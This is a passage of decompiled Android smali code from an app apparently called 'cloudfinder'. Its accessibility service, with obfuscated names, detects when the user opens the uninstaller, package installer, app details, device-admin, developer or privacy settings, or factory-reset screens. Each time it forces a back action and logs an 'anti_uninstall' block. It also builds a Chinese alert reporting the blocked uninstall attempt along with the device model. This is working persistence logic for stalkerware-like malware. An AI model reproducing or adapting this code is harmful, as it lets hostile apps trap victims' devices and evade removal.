    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return v5

    :catch_0
    :cond_10
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ل(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result p1

    if-eqz p1, :cond_12

    const-string p1, "BLOCKED|path=installer_screen|pkg="

    invoke-static {p1, v3}, Landroidx/activity/result/؋;->س(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_7

    :cond_11
    :goto_4
    new-instance p1, Ljava/lang/StringBuilder;

    const-string v0, "BLOCKED|path=uninstaller_activity|pkg="

    invoke-direct {p1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v11, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    new-instance p1, Ljava/lang/StringBuilder;

    const-string v0, "\ud83d\uddd1\ufe0f <b>\u5378\u8f7d\u5c1d\u8bd5\u5df2\u62e6\u622a</b>\nDevice: "

    invoke-direct {p1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\nPkg: "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lںڍڒڸ/ش;->ٹ(Ljava/lang/String;)V

    goto/16 :goto_8

    :cond_12
    if-nez v6, :cond_13

    if-eqz v4, :cond_15

    :cond_13
    const-string p1, "installedappdetail"

    invoke-virtual {v9, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_14

    const-string p1, "appdetail"

    invoke-virtual {v9, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_14

    const-string p1, "applicationdetail"

    invoke-virtual {v9, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_15

    :cond_14
    :try_start_1
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-eqz p1, :cond_15

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    invoke-virtual {v0, v4}, Landroid/content/pm/PackageItemInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ف(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_15

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v11, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    return v5

    :catch_1
    :cond_15
    if-eqz v6, :cond_19

    const-string p1, "developmentsettings"

    invoke-virtual {v9, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_18

    const-string p1, "privacysettings"

    invoke-virtual {v9, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_16

    goto :goto_5

    :cond_16
    const-string p1, "com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd"

    invoke-virtual {v7, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_17

    const-string p1, "com.miui.permcenter.privacymanager.DeviceManagerApplyActivity"

    invoke-virtual {v7, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_19

    :cond_17
    const-string p1, "BLOCKED|path=device_admin|cls="

    goto :goto_6

    :cond_18
    :goto_5
    const-string p1, "BLOCKED|path=dev_privacy_settings|cls="

    :goto_6
    invoke-virtual {p1, v7}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    :goto_7
    invoke-static {v11, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    :goto_8
    invoke-virtual {p0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return v5

    :cond_19
    :goto_9
    return v2
.end method

.method public final إ(Ljava/lang/String;)V
    .locals 14

    const-string v0, "BLOCKED|path=content_installer|pkg="

    const-string v1, "BLOCKED|path=content_settings|pkg="

    invoke-virtual {p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ـ()Z

    move-result v2

    if-nez v2, :cond_0

    return-void

    :cond_0
    if-nez p1, :cond_1

    return-void

    :cond_1
    sget-boolean v2, Lسۄھؤۏ۫/؋;->ر:Z

    if-nez v2, :cond_17

    sget-boolean v2, Lسۄھؤۏ۫/؋;->د:Z

    if-eqz v2, :cond_2

    goto/16 :goto_3

    :cond_2
    sget-boolean v2, Lسۄھؤۏ۫/؋;->ز:Z

    if-eqz v2, :cond_3

    return-void

    :cond_3
    sget-boolean v2, Lڃٷښـ۝ۼ/ؠ;->ئ:Z

    if-eqz v2, :cond_4

    return-void

    :cond_4
    sget-boolean v2, Lڗًقڔ/؋;->ئ:Z

    if-eqz v2, :cond_5

    return-void

    :cond_5
    sget-boolean v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    if-nez v2, :cond_6

    return-void

    :cond_6
    sget-object v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د:Ljava/util/HashSet;

    invoke-virtual {v2, p1}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v2

    const/4 v3, 0x1

    const/4 v4, 0x0

    if-nez v2, :cond_8

    const-string v2, "packageinstaller"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_7

    goto :goto_0

    :cond_7
    move v2, v4

    goto :goto_1

    :cond_8
    :goto_0
    move v2, v3

    :goto_1
    sget-object v5, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ذ:Ljava/util/HashSet;

    invoke-virtual {v5, p1}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v5

    if-nez v2, :cond_9

    if-nez v5, :cond_9

    return-void

    :cond_9
    if-eqz v2, :cond_a

    iget-object v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ء:Ljava/lang/String;

    invoke-virtual {p0, v6}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ق(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_a

    return-void

    :cond_a
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    iget-wide v8, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->آ:J

    sub-long v8, v6, v8

    const-wide/16 v10, 0x1f4

    cmp-long v8, v8, v10

    if-gez v8, :cond_b

    return-void

    :cond_b
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_c

    return-void

    :cond_c
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v9

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v10

    invoke-virtual {v9, v10}, Landroid/content/pm/PackageItemInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ف(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v10
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v11, "anti_uninstall"

    const-wide/16 v12, 0x2710

    if-eqz v10, :cond_e

    :try_start_1
    iput-wide v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->آ:J

    iget-wide v4, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    sub-long v4, v6, v4

    cmp-long v0, v4, v12

    if-lez v0, :cond_d

    iput-wide v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    invoke-virtual {v1, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {v11, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    :cond_d
    invoke-virtual {p0, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void

    :cond_e
    if-eqz v2, :cond_10

    invoke-virtual {p0, v8}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ل(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v1

    if-eqz v1, :cond_10

    iput-wide v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->آ:J

    iget-wide v1, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    sub-long v1, v6, v1

    cmp-long v1, v1, v12

    if-lez v1, :cond_f

    iput-wide v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    invoke-virtual {v0, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {v11, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    :cond_f
    invoke-virtual {p0, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void

    :cond_10
    if-eqz v5, :cond_17

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ـ:[Ljava/lang/String;

    array-length v1, v0

    move v2, v4

    :goto_2
    if-ge v2, v1, :cond_14

    aget-object v5, v0, v2

    invoke-virtual {v8, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v10

    if-eqz v10, :cond_13

    invoke-interface {v10}, Ljava/util/List;->isEmpty()Z

    move-result v10

    if-nez v10, :cond_13

    invoke-static {v8, v9}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ف(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v10

    if-nez v10, :cond_11

    invoke-virtual {p0, v8}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ل(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v10

    if-eqz v10, :cond_13

    :cond_11
    iput-wide v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->آ:J

    iget-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    sub-long v0, v6, v0

    cmp-long v0, v0, v12

    if-lez v0, :cond_12

    iput-wide v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "BLOCKED|path=danger_text|kw="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "|pkg="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v11, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    :cond_12
    invoke-virtual {p0, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void

    :cond_13
    add-int/lit8 v2, v2, 0x1

    goto :goto_2

    :cond_14
    invoke-static {v8, v4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ى(Landroid/view/accessibility/AccessibilityNodeInfo;I)Z

    move-result v0

    if-eqz v0, :cond_17

    invoke-static {v8, v9}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ف(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_15

    invoke-virtual {p0, v8}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ل(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v0

    if-eqz v0, :cond_17

    :cond_15
    iput-wide v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->آ:J

    iget-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    sub-long v0, v6, v0

    cmp-long v0, v0, v12

    if-lez v0, :cond_16

    iput-wide v6, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "BLOCKED|path=danger_resid|pkg="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v11, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    :cond_16
    invoke-virtual {p0, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_17
    :goto_3
    return-void
.end method

.method public final ئ(Ljava/lang/String;)V
    .locals 14

    invoke-virtual {p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ـ()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    sget-boolean v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    if-nez v0, :cond_1

    return-void

    :cond_1
    if-nez p1, :cond_2

    return-void

    :cond_2
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ذ:Ljava/util/HashSet;

    invoke-virtual {v0, p1}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    const-string v0, "com.android.settings"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_3

    return-void

    :cond_3
    sget-boolean p1, Lسۄھؤۏ۫/؋;->ر:Z

    if-nez p1, :cond_12

    sget-boolean p1, Lسۄھؤۏ۫/؋;->د:Z

    if-eqz p1, :cond_4

    goto/16 :goto_5

    :cond_4
    sget-boolean p1, Lسۄھؤۏ۫/؋;->ز:Z

    if-eqz p1, :cond_5

    return-void

    :cond_5
    sget-boolean p1, Lڃٷښـ۝ۼ/ؠ;->ئ:Z

    if-eqz p1, :cond_6

    return-void

    :cond_6
    sget-boolean p1, Lڗًقڔ/؋;->ئ:Z

    if-eqz p1, :cond_7

    return-void

    :cond_7
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؤ:J

    sub-long v2, v0, v2

    const-wide/16 v4, 0x3e8

    cmp-long p1, v2, v4

    if-gez p1, :cond_8

    return-void

    :cond_8
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-nez p1, :cond_9

    return-void

    :cond_9
    sget-object v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ق:[Ljava/lang/String;

    array-length v3, v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v4, 0x0

    move v5, v4

    :goto_0
    const/4 v6, 0x1

    const-string v7, "anti_uninstall"

    const-string v8, "MyAccessSvc"

    if-ge v5, v3, :cond_c

    :try_start_1
    aget-object v9, v2, v5

    invoke-virtual {p1, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v9

    if-eqz v9, :cond_b

    invoke-interface {v9}, Ljava/util/List;->isEmpty()Z

    move-result v10

    if-nez v10, :cond_b

    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :cond_a
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_b

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v10

    if-eqz v10, :cond_a

    invoke-interface {v10}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v11

    const-string v12, "("

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_a

    iput-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؤ:J

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "ANTI_DEL: app list count detected: \'"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v0, "\'"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v8, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "BLOCKED|path=app_list_count|title="

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v7, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v6}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void

    :cond_b
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :cond_c
    sget-object v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك:[Ljava/lang/String;

    array-length v3, v2

    :goto_1
    if-ge v4, v3, :cond_12

    aget-object v5, v2, v4

    invoke-virtual {p1, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v9

    if-eqz v9, :cond_11

    invoke-interface {v9}, Ljava/util/List;->isEmpty()Z

    move-result v10

    if-eqz v10, :cond_d

    goto :goto_4

    :cond_d
    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :goto_2
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_11

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v11, Landroid/graphics/Rect;

    invoke-direct {v11}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v10, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    iget v12, v11, Landroid/graphics/Rect;->top:I

    const/16 v13, 0xc8

    if-le v12, v13, :cond_e

    goto :goto_2

    :cond_e
    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v12

    if-eqz v12, :cond_f

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v10

    invoke-interface {v10}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v10

    goto :goto_3

    :cond_f
    const-string v10, ""

    :goto_3
    const-string v12, "TextView"

    invoke-virtual {v10, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-nez v10, :cond_10

    goto :goto_2

    :cond_10
    iput-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؤ:J

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "ANTI_DEL: app list title detected: \'"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\' bounds="

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v8, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "BLOCKED|path=app_list_title|title="

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v7, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v6}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    :cond_11
    :goto_4
    add-int/lit8 v4, v4, 0x1

    goto/16 :goto_1

    :catch_0
    :cond_12
    :goto_5
    return-void
.end method

.method public final ا(Ljava/lang/String;)V
    .locals 7

    invoke-virtual {p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ـ()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    sget-boolean v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    if-nez v0, :cond_1

    return-void

    :cond_1
    sget-boolean v0, Lسۄھؤۏ۫/؋;->ز:Z

    if-eqz v0, :cond_2

    return-void

    :cond_2
    if-nez p1, :cond_3

    return-void

    :cond_3
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ذ:Ljava/util/HashSet;

    invoke-virtual {v0, p1}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    const-string v0, "com.android.settings"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_4

    return-void

    :cond_4
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->إ:J

    sub-long v2, v0, v2

    const-wide/16 v4, 0x3e8

    cmp-long p1, v2, v4

    if-gez p1, :cond_5

    return-void

    :cond_5
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-nez p1, :cond_6

    return-void

    :cond_6
    sget-object v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ل:[Ljava/lang/String;

    array-length v3, v2

    const/4 v4, 0x0

    :goto_0
    if-ge v4, v3, :cond_8

    aget-object v5, v2, v4

    invoke-virtual {p1, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-eqz v6, :cond_7

    invoke-interface {v6}, Ljava/util/List;->isEmpty()Z

    move-result v6

    if-nez v6, :cond_7

    iput-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->إ:J

    const-string p1, "MyAccessSvc"

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "ANTI_DEL: factory reset text detected: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string p1, "anti_uninstall"

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "BLOCKED|path=factory_reset_text|kw="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    const/4 p1, 0x1

    invoke-virtual {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :cond_7
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :catch_0
    :cond_8
    return-void
.end method

.method public final ب(Ljava/lang/String;)V
    .locals 41

    move-object/from16 v0, p0

    const-string v1, "com.android.systemui"

    move-object/from16 v2, p1

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    return-void

    :cond_0
    sget-boolean v1, Lسۄھؤۏ۫/؋;->ا:Z

    if-nez v1, :cond_1

    return-void

    :cond_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

